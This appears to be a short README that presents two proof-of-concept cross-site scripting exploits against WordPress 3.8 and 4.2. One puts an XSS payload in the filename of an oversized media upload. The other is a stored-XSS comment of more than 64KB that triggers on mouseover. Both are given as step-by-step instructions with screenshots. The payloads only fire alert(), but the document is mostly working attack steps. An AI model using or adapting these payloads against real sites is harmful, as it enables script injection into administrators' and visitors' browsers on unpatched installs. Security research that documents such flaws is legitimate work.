# WPHAX 

## **Exploit 1**
WP Version used: **3.8**

**Description:**
"Upload media" section can be hacked with **XSS**.

**Steps:**

* Go to **Upload Media** menu.

* Upload a file which is more than **20MB** with `"file<img src=x onerror=alert("hacked")>.png"` name.
![Upload Media](https://i.imgur.com/Ad0wZIt.png)

* Done
![XSS](https://i.imgur.com/aRp2L62.png)


## **Exploit 2**
WP Version used: **4.2**

**Description:**
Stored **XSS** can be executed with malicious comment.

**Steps:**

* Leave a comment (with a string bigger than 64KB): `<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AA... AA'></a>`
![Leave the comment](https://i.imgur.com/VVD3ZqO.png)

* View the comment on the page
![View as admin](https://i.imgur.com/wwVBiiG.png)

* Done
![View as admin](https://i.imgur.com/0HTXTUk.png)
